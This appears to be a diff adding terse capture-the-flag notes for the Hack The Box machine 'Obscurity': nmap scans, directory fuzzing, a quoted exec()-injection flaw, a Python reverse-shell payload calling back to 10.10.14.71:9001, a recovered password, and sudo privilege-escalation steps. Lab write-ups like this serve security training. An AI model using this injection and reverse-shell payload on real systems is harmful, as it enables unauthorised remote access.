@@ -1,0 +1,205 @@
+# Intialized with initHTB by no0g
+---------------------------------------------------------------
+obscurity.htb = 10.10.10.168
+
+
+Open Ports
+------------------
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   closed http
+8080/tcp open   http-proxy
+
+----------------------------------------------------------------
+
+ Intense Scan Port 22
+
+----------------------------------------------------------------
+# Nmap 7.80 scan initiated Fri May  1 17:15:38 2020 as: nmap -A -p22 -oN intense.txt 10.10.10.168
+Nmap scan report for obscurity.htb (10.10.10.168)
+Host is up (0.0038s latency).
+
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: WAP|general purpose
+Running: Actiontec embedded, Linux 2.4.X|3.X
+OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:linux:linux_kernel:3.2 cpe:/o:linux:linux_kernel:4.4
+OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37), Linux 3.2, Linux 4.4
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   1.46 ms 172.16.203.2
+2   1.36 ms obscurity.htb (10.10.10.168)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May  1 17:15:53 2020 -- 1 IP address (1 host up) scanned in 15.09 seconds
+
+----------------------------------------------------------------
+
+----------------------------------------------------------------
+
+ Intense Scan Port 80
+
+----------------------------------------------------------------
+# Nmap 7.80 scan initiated Fri May  1 17:15:54 2020 as: nmap -A -p80 -oN intense.txt 10.10.10.168
+Nmap scan report for obscurity.htb (10.10.10.168)
+Host is up (0.035s latency).
+
+PORT   STATE  SERVICE VERSION
+80/tcp closed http
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (97%), DD-WRT v24-sp2 (Linux 2.4.37) (94%), Linux 3.2 (94%), Linux 4.4 (94%), Nokia E65 mobile phone (Symbian OS) (92%), Nokia E60 mobile phone (Symbian OS) (91%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (89%), DEC OpenVMS 7.1 (89%), Microsoft Windows XP SP3 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.18 ms 172.16.203.2
+2   0.06 ms obscurity.htb (10.10.10.168)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May  1 17:16:00 2020 -- 1 IP address (1 host up) scanned in 6.90 seconds
+
+----------------------------------------------------------------
+
+----------------------------------------------------------------
+
+ Intense Scan Port 8080
+
+----------------------------------------------------------------
+# Nmap 7.80 scan initiated Fri May  1 17:16:01 2020 as: nmap -A -p8080 -oN intense.txt 10.10.10.168
+Nmap scan report for obscurity.htb (10.10.10.168)
+Host is up (0.040s latency).
+
+PORT     STATE SERVICE    VERSION
+8080/tcp open  http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Fri, 01 May 2020 21:19:11
+|     Server: BadHTTPServer
+|     Last-Modified: Fri, 01 May 2020 21:19:11
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>0bscura</title>
+|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="keywords" content="">
+|     <meta name="description" content="">
+|     <!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     <!-- stylesheet css -->
+|     <link rel="stylesheet" href="css/bootstrap.min.css">
+|     <link rel="stylesheet" href="css/font-awesome.min.css">
+|     <link rel="stylesheet" href="css/templatemo-blue.css">
+|     </head>
+|     <body data-spy="scroll" data-target=".navbar-collapse">
+|     <!-- preloader section -->
+|     <!--
+|     <div class="preloader">
+|_    <div class="sk-spinner sk-spinner-wordpress">
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.80%I=7%D=5/1%Time=5EAC9198%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Fri,\x2001\x20May\x20202
+SF:0\x2021:19:11\nServer:\x20BadHTTPServer\nLast-Modified:\x20Fri,\x2001\x
+SF:20May\x202020\x2021:19:11\nContent-Length:\x204171\nContent-Type:\x20te
+SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
+SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
+SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
+SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
+SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
+SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
+SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
+SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
+SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
+SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
+SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
+SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
+SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
+SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20F
+SF:ri,\x2001\x20May\x202020\x2021:19:11\nServer:\x20BadHTTPServer\nLast-Mo
+SF:dified:\x20Fri,\x2001\x20May\x202020\x2021:19:11\nContent-Length:\x2041
+SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
+SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
+SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
+SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
+SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
+SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
+SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
+SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
+SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
+SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
+SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
+SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
+SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
+SF:-spinner\x20sk-spinner-wordpress\">\n");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: WAP|general purpose
+Running: Actiontec embedded, Linux 2.4.X
+OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
+OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.05 ms 172.16.203.2
+2   0.07 ms obscurity.htb (10.10.10.168)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May  1 17:16:29 2020 -- 1 IP address (1 host up) scanned in 29.08 seconds
+
+----------------------------------------------------------------
+wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+
+/develop returbs 200
+
+source code : http://obscurity.htb:8080/develop/SuperSecureServer.py
+
+----------------------------------------------------------------
+
+def serveDoc(self, path, docRoot):
+        path = urllib.parse.unquote(path)
+        try:
+            info = "output = 'Document: {}'" # Keep the output for later debug
+            exec(info.format(path)) # This line is vuln
+            cwd = os.path.dirname(os.path.realpath(__file__))
+            docRoot = os.path.join(cwd, docRoot)
+            if path == "/":
+                path = "/index.html"
+            requested = os.path.join(docRoot, path[1:])
+
+Payload = /';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.71",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);#
+
+--------------------------------------------------------------
+#to robert
+python3 lalala.py -i out.txt -o key.txt -k "$(cat check.txt)" -d
+
+cat ket.txt : alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai%  
+
+python3 lalala.py -i pass.txt -k "$(cat key.txt)" -o flag.txt -d
+
+cat flag.txt: SecThruObsFTW
+
+ss 2 robert@10.10.10.168
+--------------------------------------------------------------
+#to ROOT
+
+rename folder BetterSSH
+
+mkdir BetterSSH
+
+make ur own py
+
+run with sudo
+
+-------------------------------------------------------------
